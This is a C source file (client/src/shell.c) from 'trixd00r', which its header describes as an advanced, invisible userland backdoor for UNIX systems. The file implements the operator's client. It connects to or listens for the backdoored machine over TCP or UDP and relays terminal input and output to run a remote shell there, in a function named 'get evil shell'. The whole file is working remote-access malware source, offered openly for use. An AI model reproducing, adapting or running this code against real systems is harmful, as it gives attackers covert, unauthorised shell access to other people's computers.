/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/src/shell.c                                                          *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "shell.h"
#include "wrapper.h"
#include "verbose.h"
#include "signals.h"

#include <fcntl.h>
#include <errno.h>


static void sigint_handler();
static void handle_udp_shell(packet_t *);
static void handle_tcp_shell(int);
static void listen_udp_port(packet_t *);
static void connect_udp_port(packet_t *);
static void listen_tcp_port(packet_t *);
static void connect_tcp_port(packet_t *);


/* for SIGINT */
int user_exit = 0;


/* print available shell modes */
void print_shell_modes()
{
    unsigned char i = 0;
    const char *descr[_NUM_SHELL_MODES] = {
        TCP_CONN_PORT, TCP_BIND_PORT, UDP_CONN_PORT, UDP_BIND_PORT
    };


    printf("[+] "BLUE"available shell modes"NORM"\n");
    for (i = 0; i < _NUM_SHELL_MODES; i++) {
        printf("--- %u [%s]\n", i, descr[i]);
    }

    return;
}


/* SIGINT handler */
static void sigint_handler()
{
    user_exit = 1;

    return;
}


/* handle udp shell */
static void handle_udp_shell(packet_t *packet)
{
    char sbuff[SOCKBUF + 1], rbuff[SOCKBUF + 1];
    pid_t pid = 0;


    /* parent reads from socket */
    if ((pid = fork()) == 0) {
        while (read(packet->cfd, rbuff, sizeof(rbuff)) > 0) {
            rbuff[strlen(rbuff) + 1] = 0x00;
            fputs(rbuff, stdout);
            xmemset(&rbuff, 0x00, sizeof(rbuff));
        }
    }

    /* child writes to socket */
    while (fgets(sbuff, sizeof(sbuff), stdin) != NULL) {
        sbuff[strlen(sbuff) + 1] = 0x00;
        xsendto(packet->cfd, sbuff, strlen(sbuff), 0,
                (struct sockaddr *) &packet->srv, packet->len);
        xmemset(&sbuff, 0x00, sizeof(sbuff));
        __SEND_EXIT;
    }

    return;
}


/* handle tcp shell */
static void handle_tcp_shell(int sockfd)
{
    char sbuff[SOCKBUF], rbuff[SOCKBUF + 1];
    pid_t pid = 0;
    ssize_t len = 0;

   
    /* parent reads from socket */
    if ((pid = fork()) == 0) {
        while (read(sockfd, rbuff, sizeof(rbuff)) > 0) {
            rbuff[strlen(rbuff) + 1] = 0x00;
            fputs(rbuff, stdout);
            xmemset(&rbuff, 0x00, sizeof(rbuff));
        }
    }

    /* child writes to socket */
    while (fgets(sbuff, sizeof(sbuff), stdin) != NULL) {
        len = write(sockfd, sbuff, strlen(sbuff));
        xmemset(&sbuff, 0x00, sizeof(sbuff));
    }

    return;
}


/* listen on udp port */
static void listen_udp_port(packet_t *packet)
{
    char buff[SOCKBUF];
    const int opt = 1;


    xmemset(&buff, 0x00, sizeof(buff));

    /* create listen socket and set SO_REUSEADDR option */
    packet->lfd = xsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    xsetsockopt(packet->lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    /* fill in sockaddr_in {} */
    xmemset(&packet->srv, 0x00, sizeof(packet->srv));
    packet->srv.sin_family = AF_INET;
    packet->srv.sin_addr.s_addr = htonl(INADDR_ANY);
    packet->srv.sin_port = htons(packet->port);
    packet->len = sizeof(packet->srv);

    /* bind the motherfuckin server to given port now */
    xbind(packet->lfd, (struct sockaddr *) &packet->srv, packet->len);

    /* this crap becuase of UDP and banner read ... belelelele */
    __VERBOSE_GOT_SHELL;
    sleep(1);
    xsystem("clear");
    recvfrom(packet->cfd, buff, SOCKBUF, 0, (struct sockaddr *) &packet->srv,
             &packet->len);
    fputs(buff, stdout);
    
    /* ok let's rock */
    handle_udp_shell(packet);
    xclose(packet->lfd);
    
    return;
}


/* connect to udp port */
static void connect_udp_port(packet_t *packet)
{
    char buff[SOCKBUF];


    /* create socket and fill in sockaddr_in {} fotzen */
    packet->cfd = xsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    xmemset(&packet->srv, 0x00, sizeof(packet->srv));
    packet->srv.sin_family = AF_INET;
    packet->srv.sin_addr.s_addr = inet_addr(packet->host);
    packet->srv.sin_port = htons(packet->port);
    packet->len = sizeof(packet->srv);

    __VERBOSE_GOT_SHELL;
    
    /* this crap because of UDP and banner read ... */
    sleep(1);
    xsystem("clear");
    xconnect(packet->cfd, (struct sockaddr *) &packet->srv, packet->len);
    xsendto(packet->cfd, "", 1, 0, (struct sockaddr *) &packet->srv,
            packet->len);
    recvfrom(packet->cfd, buff, SOCKBUF, 0, (struct sockaddr *) &packet->srv,
             &packet->len);
    fputs(buff, stdout);

    /* ok let's rock */
    handle_udp_shell(packet);
    xclose(packet->cfd);

    return;
}


/* listen on tcp port */
static void listen_tcp_port(packet_t *packet)
{
    /* create listen socket and set desired socket option*/
    packet->lfd = xsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    packet->one = 1;
    xsetsockopt(packet->lfd, SOL_SOCKET, SO_REUSEADDR, &packet->one,
                sizeof(packet->one));

    /* fill in sockaddr_in struct */
    xmemset(&packet->cli, 0x00, sizeof(packet->cli));
    packet->cli.sin_family = AF_INET;
    packet->cli.sin_addr.s_addr = htonl(INADDR_ANY);
    packet->cli.sin_port = htons(packet->port);

    /* bind to port and wait for connections */
    xbind(packet->lfd, (struct sockaddr *) &packet->cli, sizeof(packet->cli));
    xlisten(packet->lfd, 1024);
    packet->cfd = xaccept(packet->lfd, (struct sockaddr *) NULL, NULL);

    /* handle shell */
    sleep(1); /* i don't know, ask your neighbour */
    __VERBOSE_GOT_SHELL;
    sleep(1);
    xsystem("clear");
    handle_tcp_shell(packet->cfd);

    /* we are done, so we can close used descriptors */
    xclose(packet->lfd);
    xclose(packet->cfd);

    return;
}


/* connect to tcp port */
static void connect_tcp_port(packet_t *packet)
{
    /* create connection socket */
    packet->cfd = xsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* fill in sockaddr_in struct */
    xmemset(&packet->srv, 0x00, sizeof(packet->srv));
    packet->srv.sin_family = AF_INET;
    packet->srv.sin_addr.s_addr = inet_addr(packet->host);
    packet->srv.sin_port = htons(packet->port);
    packet->len = sizeof(packet->srv);

    /* connect to trixd00rd */
    sleep(1); /* i don't know, ask my father... */
    xconnect(packet->cfd, (const struct sockaddr *) &packet->srv,
             sizeof(packet->srv));
    __VERBOSE_CONNECTED(packet->host, packet->port);

    /* ok, let's handle our shell session */
    __VERBOSE_GOT_SHELL;
    sleep(1);
    xsystem("clear");
    handle_tcp_shell(packet->cfd);

    /* we are done, so we close used descriptors */
    xclose(packet->cfd);
    
    return;
}


/* get evil shell */
void get_shell(shell_t *shell)
{
    packet_t *packet = (packet_t *) shell->packet;


    switch (shell->mode) {
     case _TCP_CONN_PORT:
         connect_tcp_port(packet);
         break;
     case _TCP_BIND_PORT:
         listen_tcp_port(packet);
         break;
     case _UDP_CONN_PORT:
         xsignal(SIGINT, sigint_handler);
         connect_udp_port(packet);
         break;
     case _UDP_BIND_PORT:
         xsignal(SIGINT, sigint_handler);
         listen_udp_port(packet);
         break;
    }

    return;
}

/* EOF */
